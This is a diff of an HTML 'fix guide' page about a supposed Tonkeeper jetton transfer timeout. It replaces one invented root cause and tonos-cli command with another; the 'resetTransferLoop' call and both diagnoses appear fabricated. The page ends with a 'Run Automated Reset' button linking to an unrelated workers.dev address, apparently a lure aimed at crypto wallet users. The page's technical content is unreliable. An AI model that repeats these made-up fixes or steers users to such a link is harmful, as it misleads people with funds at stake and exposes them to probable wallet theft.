@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0f111a;
+        font-family: system-ui;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,28 +42,30 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an unclear error message indicating a transfer loop timeout.</li>
+<li>Users encounter a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a misconfiguration in the TON network's smart contract, causing an infinite loop during the transfer process, which eventually leads to a timeout.</li>
+<li>The error occurs due to a synchronization issue between the Tonkeeper wallet and the TON blockchain, causing the transfer loop to exceed the maximum allowed time, thus timing out.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Increase the gas limit for the transaction</li>
-<li>Verify the smart contract's configuration to ensure it is correctly set up</li>
-<li>Use a custom script to bypass the loop:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Increase the timeout threshold using the <code>tonos-cli</code> command</li>
+<li>Verify the wallet's connection to the TON blockchain using <code>tonos-cli config</code></li>
+<li>Reset the transfer loop by executing the following code:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span><span class="m">0</span>:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="w"> </span>JettonTransfer<span class="w"> </span><span class="s2">&quot;-1&quot;</span><span class="w"> </span>--<span class="w"> </span>wallet<span class="w"> </span><span class="m">0</span>:yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>-s<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>--abi<span class="w"> </span>TonkeeperWallet.abi<span class="w"> </span>resetTransferLoop<span class="w"> </span><span class="o">{}</span>
 </code></pre></div>
 
-<p>Prerequisites:
-* Basic understanding of TON network and smart contracts
-* Access to the Tonos-CLI tool
-* Familiarity with bash scripting
-Consider using an external console, such as the TonHub extension, to execute these commands for a more streamlined experience.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-network-error-when-switching-to-sepolia-.html">Metamask Extension Bug Network Error When Switching To Sepolia</a></li><li><a href="./archive/2026/06/tron-test-error.html">TRON test error</a></li><li><a href="./archive/2026/06/eth-test-error.html">ETH Test Error</a></li></ul>
+<p>Consider utilizing an external console for a more streamlined debugging experience.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Tonos-cli installed and configured on the system</li>
+<li>Tonkeeper wallet set up and connected to the TON blockchain</li>
+<li>Basic understanding of TON blockchain and Tonkeeper wallet functionality</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li><li><a href="./archive/2026/06/metamask-extension-bug-after-sending-a-transaction-on-custom-ne.html">Metamask Extension Bug After Sending A Transaction On Custom Network</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
